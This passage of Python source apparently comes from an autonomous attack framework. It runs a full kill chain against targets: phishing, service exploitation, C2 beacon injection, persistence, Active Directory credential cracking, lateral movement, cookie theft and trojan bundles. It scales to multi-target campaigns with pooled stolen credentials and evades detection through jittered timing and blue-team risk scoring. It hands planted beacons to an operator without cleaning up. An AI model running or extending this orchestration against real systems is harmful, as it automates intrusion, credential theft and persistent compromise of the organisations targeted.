            if cap is None:
                continue
            # post-exploitation is gated on the beacon session (its own guard);
            # re-arming it here would just fail fast again — skip it.
            if cap.category == "post":
                continue
            # poisoned moves are deterministic dead ends: re-arming them
            # would just burn the recovery budget on the same failure.
            # EXCEPTION: beacon_deploy poisoned by an ENVIRONMENT gap that a
            # recovery escalation just fixed (SSH port unknown → probed port
            # 22 and every pair "failed"). The deep scan is itself a recovery
            # step, so once it has produced NEW service facts the poison must
            # be lifted — otherwise the run can never reach the beacon even
            # though the fix (correct SSH port) is now in the WorldModel.
            if cid in self._poisoned:
                if cid == "beacon_deploy" and self.wm.has_any("service"):
                    self._poisoned.discard(cid)
                    self._fail_notes.clear()
                else:
                    continue
            # a missing tool is a DETERMINISTIC failure, not a transient:
            # re-arming the capability can never install the tool, so it would
            # only burn the recovery budget and postpone the clean halt.
            if cap.tools and self.toolchain.missing(cap.tools):
                continue
            # repeat-guard: a recon capability that already ran cleanly must
            # not be re-armed just because an identical attempt later timed
            # out — that produced the observed loop (scan 4min → timeout →
            # re-arm → scan 4min → …) with zero net progress. Only re-arm a
            # failed RECON move when it has never produced its facts.
            if cap.category == "recon" and not self._poisoned:
                produced = any(f.kind in cap.effects for f in self.wm.all_findings())
                if produced:
                    continue
            self._failed_caps.pop(cid, None)
            rearmed += 1
        self._emit("recover", goal=goal, rearmed=rearmed,
                   recovery=f"{self._recoveries}/{self._max_recoveries}",
                   detail="no path/move: re-arming failed capabilities to "
                          "keep pushing toward the beacon")
        return rearmed > 0

    def run(self, goal: str = "complete_kill_chain",
            max_iterations: int = 20,
            checkpoint_path: Optional[str] = None,
            phase_wait: Optional[str] = None,
            phase_wait_timeout: float = 900.0) -> Dict[str, Any]:
        """Run the kill chain; `phase_wait` optionally gates the start of
        the loop on a WorldModel fact (same-target worker discipline: a
        phase worker never fires tools before its phase facts exist).

        With goal="deep" the run does NOT stop at the beacon: it walks the
        DEEP_STAGES ladder back-to-back (deliver -> post_exploit -> ad ->
        crack -> lateral). Every stage ends when its own goal facts exist or
        when the planner proves no further move is viable, so a deep run
        terminates with whatever depth the target allowed (up to domain
        credentials + lateral movement) and hands the beacon over once.
        """
        self.goal = goal
        self._emit("start", target=self.target, goal=goal,
                   aggressive=self.aggressive,
                   worker=phase_wait or "lead")
        if checkpoint_path:
            try:
                self.save_state(checkpoint_path)
            except Exception:
                pass
        if not self._scope_ok():
            self._emit("halt", reason=f"target {self.target} out of scope")
            self.result = self._finalize()
            self._emit("done", **self.result)
            return self.result
        orch = Orchestrator(self.wm, self.stealth_engine,
                            worker=self._orchestrator_worker)
        try:
            if goal == DEEP_GOAL:
                stage_results: Dict[str, bool] = {}
                for _idx, _sg in enumerate(DEEP_STAGES, 1):
                    self._recoveries = 0  # fresh stall budget per stage
                    _ok = self._drive_stage(
                        _sg, max_iterations, checkpoint_path, orch,
                        phase_wait, phase_wait_timeout)
                    stage_results[_sg] = _ok
                    self._emit("stage", index=_idx, stage=_sg,
                               satisfied=_ok, total=len(DEEP_STAGES),
                               detail="stage goal satisfied" if _ok else
                               "no further move viable in this stage")
                self._stage_outcomes = dict(stage_results)
            else:
                self._drive_stage(goal, max_iterations, checkpoint_path, orch,
                                  phase_wait, phase_wait_timeout)
        except Exception:
            raise
        finally:
            # ensure the orchestrator stops draining so no agent thread
            # keeps the process alive after run() returns (test isolation).
            try:
                orch.stop()
            except Exception:
                pass
        # final reasoning pass: capture deductions produced by the last
        # executed wave (idempotent, so no duplicates)
        try:
            self.reasoning.run(self.wm, peers=self.share.peers)
        except Exception:
            pass
        self._resolve_hypotheses()
        # enterprise assessment: MITRE ATT&CK mapping + composite target risk
        # (read-only enrichment for the report)
        try:
            self.enterprise.assess(self.wm)
        except Exception:
            pass
        # enterprise learning: flush this run's per-capability outcomes to
        # the disk-persisted Bayesian calibration + historical analyzer ONCE,
        # outside the hot loop (opt-in via persist_learning).
        if self.persist_learning:
            try:
                self.enterprise.persist()
            except Exception:
                pass
            # v3.0: persist historical self-learning
            if self._history:
                try:
                    self._history.persist()
                except Exception:
                    pass
        # v3.0: attack graph summary for reporting
        try:
            from phantom.automation.attack_chain import build_attack_summary
            summary = build_attack_summary(self.wm)
            self._emit("attack_graph", **summary)
        except Exception:
            pass
        # operator handoff: the beacon belongs to the operator now. The
        # auto-mode NEVER cleans up on its own — the operator takes over
        # from the C2 shell, inspects and cleans up manually.
        if self._session is not None:
            self._emit("handoff", beacon_id=self._session.beacon_id,
                       detail="beacon under operator control; "
                              "cleanup is manual from the C2 shell")
        self.result = self._finalize()
        self._emit("done", **self.result)
        return self.result

    def _drive_stage(self, goal: str, max_iterations: int,
                     checkpoint_path: Optional[str], orch,
                     phase_wait: Optional[str],
                     phase_wait_timeout: float) -> bool:
        """Drive ONE planner goal to its terminal condition: True when the
        stage's goal facts exist, False when the stage exhausted its moves
        (bounded recoveries) without reaching them. Shared by single-goal
        runs (goal != deep) and every stage of a deep run."""
        for _ in range(max_iterations):
            if phase_wait and not self.wm.has_any(phase_wait):
                if not self._wait_phase(phase_wait, phase_wait_timeout):
                    self._emit("halt", reason=(
                        f"phase gate timeout: '{phase_wait}' never "
                        f"materialised (worker stays quiet)"))
                    return False
            # reasoning: findings -> deduced findings + hypotheses, then
            # the hypotheses bias the planner (preferred sources first)
            reason = self.reasoning.run(self.wm, peers=self.share.peers)
            if reason.findings:
                self._emit("inference", findings=[
                    {"kind": f.kind, "key": f.key, "value": f.value}
                    for f in reason.findings])
            if reason.hypotheses:
                self._emit("reason", hypotheses=[
                    {"capability": h.capability_id, "reason": h.reason,
                     "priority": round(h.priority, 2)}
                    for h in reason.hypotheses])
            prefs = list(reason.preferences)
            # optional local-LLM advisor: adds candidate capability ids
            # only (never authorizes). Validated against the registry
            # and, in paranoid mode, stripped of loud capabilities.
            llm_prefs = self.llm_advisor.suggest(self.wm, self.registry)
            if llm_prefs:
                self._emit("llm", hypotheses=llm_prefs)
                for cid in llm_prefs:
                    if cid not in prefs:
                        prefs.append(cid)
            plan = self.planner.plan_strategic(
                self.wm, goal=goal, dead=self._dead_cap_ids(),
                preference=prefs)
            # degradation tracking: when the planner could not reach this
            # goal for the target TYPE and fell back (identity->footprint on
            # an IP, network->OSINT on an email), record the fallback so
            # _goal_reached can accept the degraded terminal state instead
            # of spinning recoveries after facts that can never exist.
            if plan.strategy.startswith("fallback:"):
                try:
                    self._fallback_goal = plan.strategy.split("->", 1)[1]
                except (IndexError, AttributeError):
                    self._fallback_goal = ""
            elif getattr(self, "_fallback_goal", "") and plan.steps:
                # a normal (non-fallback) plan with steps: goal is live again
                self._fallback_goal = ""
            self._emit("plan", steps=[s.capability.id for s in plan.steps],
                       complete=plan.complete,
                       strategy=plan.strategy,
                       strategy_chain=plan.strategy_chain,
                       strategic=plan.strategic)
            if plan.complete and not plan.steps:
                return True  # stage goal already satisfied
            if not plan.steps:
                # no path to the goal right now: escalate instead of
                # halting — re-arm failed capabilities (bounded) so the
                # agent keeps probing alternate angles toward the beacon
                if self._recover_stall(goal):
                    continue
                self._emit("halt", reason=plan.blocked_reason or "no plan")
                return False
            # submit the plan (cheapest-first order), skipping failed caps
            # unless new facts make them viable again. Only steps whose
            # preconditions hold NOW are submitted: the chain executes in
            # waves as facts arrive (osint -> phish -> poll -> victim_ip
            # -> scan -> ...), the rest is re-planned next iteration.
            submitted = False
            for step in reversed(plan.steps):
                if not self._retry_eligible(step.capability):
                    continue
                try:
                    if not all(p(self.wm) for p in step.capability.preconditions):
                        continue  # deferred: needs facts this plan produces
                except Exception:
                    pass
                orch.submit(step.capability.id, self.target,
                            priority=self._priority(step),
                            slot_values=step.slot_values)
                submitted = True
            if not submitted:
                # every candidate move is stale/deferred: escalate (bounded)
                # rather than giving up before the beacon is injected
                if self._recover_stall(goal):
                    continue
                self._emit("halt", reason="no new move available "
                                          "(all failed capabilities are stale)")
                return False
            # hunt_web can legitimately run ~60-90s (bounded probe
            # budget); a 120s drain timeout would cut it mid-run and
            # cause overlapping re-plans. Give the drain generous
            # headroom so long capabilities finish in one pass.
            orch.run(drain_timeout=600.0)  # drains until empty
            self._recoveries = 0  # a move ran: reset the stall counter
            # close the loop: facts just produced confirm/refute the
            # pending hypotheses (fact-based, so ordering never matters)
            self._resolve_hypotheses()
            if checkpoint_path:
                try:
                    self.save_state(checkpoint_path)
                except Exception:
                    pass
            if self._goal_reached(goal):
                self._emit("success", detail=f"goal {goal} satisfied")
                return True
        return self._goal_reached(goal)

    def _wait_phase(self, fact_kind: str, timeout: float) -> bool:
        """Poll for a WorldModel fact (shared across same-target workers);
        used to keep phase workers quiet until their phase facts exist."""
        started = time.time()
        while time.time() - started < timeout:
            if self.wm.has_any(fact_kind):
                self._emit("gate", fact=fact_kind,
                           waited=round(time.time() - started, 1))
                return True
            time.sleep(2.0)
        return False

    def _goal_reached(self, goal: str) -> bool:
        from phantom.automation.planner import GOAL_FACTS
        goal_facts = GOAL_FACTS.get(goal, GOAL_FACTS["complete_kill_chain"])
        if all(self.wm.has_any(g) for g in goal_facts):
            return True
        # graceful-degradation acceptance — ONLY when the planner actually
        # degraded this run (fallback: strategy recorded in _drive_stage):
        # the fallback goal's facts are the honest terminal state for this
        # target class, and chasing the original facts would just burn the
        # recovery budget repeating probes ("no affordable path" loops).
        fb_goal = getattr(self, "_fallback_goal", "")
        if fb_goal and fb_goal != goal:
            fb_facts = GOAL_FACTS.get(fb_goal, [])
            if fb_facts and any(self.wm.has_any(f) for f in fb_facts):
                return True
        return False

    def _resolve_hypotheses(self) -> List[Dict[str, str]]:
        """Close pending hypotheses against the world state (fact-based):
        confirmed when the capability's effect fact is present, refuted when
        it ran without producing it, abandoned when it could never run."""
        try:
            resolved = self.reasoning.resolve(
                self.wm, failed_cap_ids=self._failed_caps)
        except Exception:
            return []
        if resolved:
            self._emit("hypothesis", resolved=resolved)
        return resolved

    def _priority(self, step: PlanStep) -> float:
        # expected value heuristic: cheap + low detection wins
        # KILL-CHAIN ORDER: before any service is known, the footprint scan
        # outranks everything (a blind http_probe/ssh_banner fired before
        # the scan "fails" and reads as a random order). Once services
        # exist, the normal value ranking applies.
        if not self.wm.has_any("service") and "service" in step.capability.effects:
            return 100.0
        risk = self.blue_team.risk(step.capability.category,
                                   step.capability.stealth_level,
                                   step.capability.opsec_cost)
        priority = (1.0 - risk) / max(0.1, step.capability.opsec_cost)
        # enterprise: bounded success-rate prior learned this engagement
        priority = self.enterprise.prior(step.capability.id,
                                         step.capability.category, priority)
        # threat intel: a version-matched exploit targeting a CVE that is
        # actively exploited in the wild is worth prioritizing now
        if step.capability.id == "service_exploit":
            try:
                from phantom.automation.guidance.kit import _best_fingerprinted_module
                module, _ = _best_fingerprinted_module(self.wm)
                if module is not None and self.enterprise.cve_threat(
                        module.cve_id).get("exploited"):
                    priority *= 1.5
            except Exception:
                pass
        if step.capability.category == "post":
            priority -= 10.0  # post-exploitation ALWAYS runs after the beacon
        return priority

    def _orchestrator_worker(self, action: PrioritizedAction, ctx: dict) -> bool:
        cap = self.registry.get(action.capability_id)
        if cap is None:
            return False
        step = PlanStep(capability=cap, slot_values=action.slot_values)
        before = len(self.wm.actions_taken)
        ok = self._execute_capability(step)
        # enterprise learning: record only REAL attempts (an action was
        # recorded), never deferrals/blocks; ok == made new progress
        if len(self.wm.actions_taken) > before:
            self.enterprise.record(cap.id, ok)
        return ok

    def _finalize(self) -> Dict[str, Any]:
        beacons = self.wm.find("beacon")
        creds = self.wm.find("creds", valid=True)
        services = self.wm.find("service")
        return {
            "target": self.target,
            "goal": self.goal,
            "stages": dict(self._stage_outcomes or {}),
            "beacon_id": self._session.beacon_id if self._session else "",
            "beacon_established": bool(beacons),
            "beacon_count": len(beacons),
            "creds_found": len(creds),
            "services_enumerated": len(services),
            "hunt_anomalies": len(self.wm.find("hunt_anomaly")),
            "identity_profiles": len(self.wm.find("identity")),
            "victim_ips": len(self.wm.find("victim_ip")),
            "phishes_sent": len(self.wm.find("phish")),
            "persistence_installed": bool(self.wm.find("persistence")),
            "system_privilege": bool(self.wm.find("system_privilege")),
            "beacon_injected": bool(self.wm.find("injection")),
            "ad_domains": len(self.wm.find("ad_domain")),
            "ad_creds": len(self.wm.find("ad_creds")),
            "cracked_hashes": len(self.wm.find("cracked")),
            "lateral_movements": len(self.wm.find("pivot")),
            "cleanup_done": bool(self.wm.find("cleanup")),
            "stolen_cookies": len(self.wm.find("stolen_cookies")),
            "bt_devices": len(self.wm.find("bt_device")),
            "cdp_cookie_sets": len(self.wm.find("cdp_cookies")),
            "socks_proxies": len(self.wm.find("socks_proxy")),
            "trojan_bundles": len(self.wm.find("trojan_bundle")),
            "inferences": len([f for f in self.wm.all_findings()
                              if f.source == "reasoning"]),
            "hypotheses": len(self.wm.hypotheses),
            "hypotheses_confirmed": len([h for h in self.wm.hypotheses
                                        if h.status == "confirmed"]),
            "hypotheses_refuted": len([h for h in self.wm.hypotheses
                                      if h.status == "refuted"]),
            "hypotheses_abandoned": len([h for h in self.wm.hypotheses
                                        if h.status == "abandoned"]),
            "opsec_spent": round(self.wm.opsec_spent, 2),
            "actions_taken": len(self.wm.actions_taken),
            "failures": len(self.wm.failures),
            "campaign_trail": [e for e in self.sink.events],
        }


def _run_target_with_workers(target: str, profile: str, aggressive: bool,
                             goal: str, on_event: Optional[Callable[[str, dict], None]],
                             max_iterations: int,
                             scope_list: Optional[List[str]],
                             toolchain, runner, cred_discoverer, sandbox,
                             share: Optional[ShareContext],
                             beacon_builder, social_engine,
                             state_path: Optional[str],
                             workers_per_target: int,
                             hunt_runner=None,
                             hunt_delay: Optional[float] = None,
                             paranoid: bool = False,
                             speed: bool = False,
                             threat_intel=None,
                             persist_learning: bool = False,
                             llm: bool = False) -> tuple:
    """Same-target parallel workers sharing ONE WorldModel (stealth design).

    The lead runs the full kill chain as usual; extra workers deepen single
    phases without ever firing tools concurrently on the same host:

      workers_per_target >= 2  -> deepen worker   (goal "enrich", no gate:
                                  passive OSINT/breach/profile deepening +
                                  grabber polling while the LEAD waits for
                                  the human — the wait is never idle, and a
                                  newly discovered email/phone/handle can
                                  prove waiting was unnecessary)
      workers_per_target >= 2  -> exploit worker  (goal "exploit", gate:
                                  waits until `service` facts exist)
      workers_per_target >= 3  -> post worker     (goal "post_exploit", gate:
                                  waits until a `beacon` is registered)

    The gates are fact-based, not time-based: a worker stays silent until
    the shared world model contains the facts its phase needs, and every
    worker start is jittered (3-9s) so tool launches are staggered. The
    lead sees worker findings the next iteration (and vice versa).
    """
    import random as _r
    from phantom.automation.guidance.targets import classify_target
    wm = WorldModel(target=target, target_type=classify_target(target))

    def _build(worker: Optional[str] = None) -> "AutonomousAgent":
        if worker is not None:
            def ev(kind, data, _w=worker):
                if on_event:
                    on_event(kind, {**data, "target": target, "worker": _w})
        else:
            ev = on_event
        agent = AutonomousAgent(
            target=target, profile=profile, aggressive=aggressive,
            paranoid=paranoid, speed=speed,
            on_event=ev, scope_list=scope_list, toolchain=toolchain,
            cred_discoverer=cred_discoverer, sandbox=sandbox, share=share,
            beacon_builder=beacon_builder, social_engine=social_engine,
            shared_wm=wm, hunt_runner=hunt_runner, hunt_delay=hunt_delay,
            threat_intel=threat_intel, persist_learning=persist_learning,
            llm=llm)
        if runner is not None:
            from phantom.automation.runtime.stealth_runtime import TimingGovernor
            agent.runtime = StealthRuntime(
                agent.stealth_engine, runner=runner,
                cost_per_action=0.5,
                governor=TimingGovernor(base_delay=0.0, jitter=0.0))
        return agent

    worker_specs = []
    if workers_per_target >= 2:
        worker_specs.append(("deepen", "enrich", ""))
    if workers_per_target >= 2:
        worker_specs.append(("exploit", "exploit", "service"))
    if workers_per_target >= 3:
        worker_specs.append(("post", "post_exploit", "beacon"))

    threads = []
    worker_results: Dict[str, Any] = {}
    for role, wgoal, gate in worker_specs:
        def _worker(role=role, wgoal=wgoal, gate=gate):
            time.sleep(_r.uniform(3.0, 9.0))  # staggered start (stealth)
            try:
                wagent = _build(worker=role)
                worker_results[role] = wagent.run(
                    goal=wgoal, max_iterations=max_iterations,
                    phase_wait=gate, phase_wait_timeout=1200.0)
            except Exception as e:
                worker_results[role] = {"error": str(e)}
        th = threading.Thread(target=_worker, daemon=True)
        th.start()
        threads.append(th)

    lead = _build()
    result = lead.run(goal=goal, max_iterations=max_iterations,
                      checkpoint_path=state_path)
    for th in threads:
        th.join(timeout=300.0)
    if worker_results:
        result = {**result, "workers": worker_results}
    return result, lead


def run_autonomous(target: str, target_type: str = "auto",
                   profile: str = "enterprise", aggressive: bool = False,
                   stealth: bool = True,
                   paranoid: bool = False,
                   speed: bool = False,
                   goal: str = "complete_kill_chain",
                   on_event: Optional[Callable[[str, dict], None]] = None,
                   max_iterations: int = 20,
                   return_agent: bool = False,
                   scope_list: Optional[List[str]] = None,
                   toolchain: Optional[ToolRegistry] = None,
                   runner: Optional[Callable[[str, float], Any]] = None,
                   cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                   sandbox: Optional[SandboxEngine] = None,
                   share: Optional[ShareContext] = None,
                   beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                   social_engine: Optional[Any] = None,
                   trojan_assets: Optional[Dict[str, str]] = None,
                   state_path: Optional[str] = None,
                   command_seed: int = 0,
                   workers_per_target: int = 1,
                   hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                   hunt_delay: Optional[float] = None,
                   threat_intel=None,
                   persist_learning: bool = False,
                   llm: bool = False):
    """Full autonomous kill-chain run against a target.

    target_type defaults to "auto": the target is classified at runtime as
    ip/domain/url/email/username/phone and the kill chain is adapted to
    the type (identity targets run OSINT -> phish -> victim_ip first, then
    the network chain converges on beacon injection + persistence).

    With state_path set, the run resumes from the checkpoint file when it
    exists (world model + dead capabilities restored) and writes a
    checkpoint after every wave so an interrupted run continues from the
    last persisted facts.

    workers_per_target > 1 fans the same target out to phase workers
    sharing one WorldModel (exploit / post workers, fact-gated + jittered
    starts) — see _run_target_with_workers for the stealth contract.

    Returns the result dict; with return_agent=True returns (result, agent).
    """
    if state_path and os.path.exists(state_path):
        agent = AutonomousAgent.from_state(
            state_path, on_event=on_event, scope_list=scope_list,
            toolchain=toolchain, runner=runner,
            cred_discoverer=cred_discoverer, sandbox=sandbox,
            share=share, beacon_builder=beacon_builder,
            social_engine=social_engine, trojan_assets=trojan_assets,
            command_seed=command_seed, hunt_runner=hunt_runner,
            hunt_delay=hunt_delay)
        agent.enterprise = EnterpriseBrain(agent.profile,
                                           threat_intel=threat_intel)
        agent.persist_learning = persist_learning
        if llm:
            from phantom.automation.llm_advisor import LLMAdvisor
            agent.llm_advisor = LLMAdvisor(enabled=True,
                                           paranoid=agent.paranoid)
        result = agent.run(goal=goal, max_iterations=max_iterations,
                           checkpoint_path=state_path)
        if return_agent:
            return result, agent
        return result
    if workers_per_target > 1:
        result, agent = _run_target_with_workers(
            target=target, profile=profile, aggressive=aggressive,
            paranoid=paranoid, speed=speed,
            goal=goal, on_event=on_event, max_iterations=max_iterations,
            scope_list=scope_list, toolchain=toolchain, runner=runner,
            cred_discoverer=cred_discoverer, sandbox=sandbox,
            share=share, beacon_builder=beacon_builder,
            social_engine=social_engine, state_path=state_path,
            workers_per_target=workers_per_target, hunt_runner=hunt_runner,
            hunt_delay=hunt_delay, threat_intel=threat_intel,
            persist_learning=persist_learning, llm=llm)
        if return_agent:
            return result, agent
        return result
    agent = AutonomousAgent(target, target_type, profile, aggressive,
                            stealth, paranoid, speed, on_event,
                            scope_list=scope_list,
                            toolchain=toolchain,
                            cred_discoverer=cred_discoverer,
                            sandbox=sandbox, share=share,
                            beacon_builder=beacon_builder,
                            social_engine=social_engine,
                            trojan_assets=trojan_assets,
                            command_seed=command_seed,
                            hunt_runner=hunt_runner,
                            hunt_delay=hunt_delay,
                            threat_intel=threat_intel,
                            persist_learning=persist_learning,
                            llm=llm)
    if runner is not None:
        from phantom.automation.runtime.stealth_runtime import TimingGovernor
        agent.runtime = StealthRuntime(
            agent.stealth_engine, runner=runner,
            cost_per_action=0.5,
            governor=TimingGovernor(base_delay=0.0, jitter=0.0))
    result = agent.run(goal=goal, max_iterations=max_iterations,
                       checkpoint_path=state_path)
    if return_agent:
        return result, agent
    return result


def run_campaign(targets: List[str], profile: str = "enterprise",
                 aggressive: bool = False,
                 paranoid: bool = False,
                 speed: bool = False,
                 goal: str = "complete_kill_chain",
                 scope_list: Optional[List[str]] = None,
                 max_agents: int = 3, on_event: Optional[Callable[[str, dict], None]] = None,
                 max_iterations: int = 20,
                 toolchain: Optional[ToolRegistry] = None,
                 runner: Optional[Callable[[str, float], Any]] = None,
                 cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                 sandbox: Optional[SandboxEngine] = None,
                 share: Optional[ShareContext] = None,
                 beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                 social_engine: Optional[Any] = None,
                 state_dir: Optional[str] = None,
                 workers_per_target: int = 1,
                 hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                 hunt_delay: Optional[float] = None,
                 threat_intel=None,
                 persist_learning: bool = False,
                 llm: bool = False) -> Dict[str, Any]:
    """Multi-target campaign: one sub-agent per target, fanned out through a
    bounded pool (`max_agents` concurrent sub-agents).

    Every sub-agent is fully autonomous (own WorldModel, own beacon
    session, own retry discipline). A shared ShareContext pools credentials
    across sub-agents (reuse / lateral movement) and lists the peer targets.
    Events are streamed with the target attached so the console can tell
    the sub-agents apart. Returns {target: result} plus campaign-level
    aggregates.

    workers_per_target > 1 additionally spawns same-target phase workers
    (exploit at >=2, post at >=3) sharing one WorldModel per target:
    fact-gated and jittered, so tools never fire concurrently on one host.
    """
    import threading

    if not targets:
        return {"targets": [], "results": {}}
    scope_list = scope_list or []
    share = share if share is not None else ShareContext(peers=list(targets))

    results: Dict[str, Dict[str, Any]] = {}
    agents: Dict[str, Any] = {}
    lock = threading.Lock()
    sem = threading.BoundedSemaphore(max(1, max_agents))

    def _fan_out(target: str) -> None:
        def _stream(kind: str, data: dict) -> None:
            if on_event:
                on_event(kind, {**data, "target": target})

        state_path = None
        if state_dir:
            import re
            safe = re.sub(r"[^A-Za-z0-9._\-]", "_", target)
            state_path = os.path.join(state_dir, f"{safe}.json")
        with sem:
            if workers_per_target > 1:
                result, agent = _run_target_with_workers(
                    target=target, profile=profile, aggressive=aggressive,
                    paranoid=paranoid, speed=speed,
                    goal=goal, on_event=_stream,
                    max_iterations=max_iterations,
                    scope_list=scope_list, toolchain=toolchain, runner=runner,
                    cred_discoverer=cred_discoverer, sandbox=sandbox,
                    share=share, beacon_builder=beacon_builder,
                    social_engine=social_engine, state_path=state_path,
                    workers_per_target=workers_per_target,
                    hunt_runner=hunt_runner, hunt_delay=hunt_delay,
                    threat_intel=threat_intel,
                    persist_learning=persist_learning, llm=llm)
            else:
                result, agent = run_autonomous(
                    target=target, profile=profile, aggressive=aggressive,
                    paranoid=paranoid, speed=speed,
                    goal=goal, on_event=_stream, max_iterations=max_iterations,
                    return_agent=True, scope_list=scope_list,
                    toolchain=toolchain, runner=runner,
                    cred_discoverer=cred_discoverer, sandbox=sandbox,
                    share=share, beacon_builder=beacon_builder,
                    social_engine=social_engine,
                    state_path=state_path, hunt_runner=hunt_runner,
                    hunt_delay=hunt_delay, threat_intel=threat_intel,
                    persist_learning=persist_learning, llm=llm)
        with lock:
            results[target] = result
            agents[target] = agent

    threads = [threading.Thread(target=_fan_out, args=(t,), daemon=True)
               for t in targets]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return {
        "targets": targets,
        "goal": goal,
        "results": results,
        "beacons": sum(1 for r in results.values() if r.get("beacon_established")),
        "persistent": sum(1 for r in results.values() if r.get("persistence_installed")),
        "compromised_creds": sum(r.get("creds_found", 0) for r in results.values()),
        "services": sum(r.get("services_enumerated", 0) for r in results.values()),
        "pivots": sum(r.get("lateral_movements", 0) for r in results.values()),
        "ad_domains": sum(r.get("ad_domains", 0) for r in results.values()),
        "cracked_hashes": sum(r.get("cracked_hashes", 0) for r in results.values()),
        "cleanup_done": sum(1 for r in results.values() if r.get("cleanup_done")),
        "failures": sum(r.get("failures", 0) for r in results.values()),
        "_agents": agents,
    }
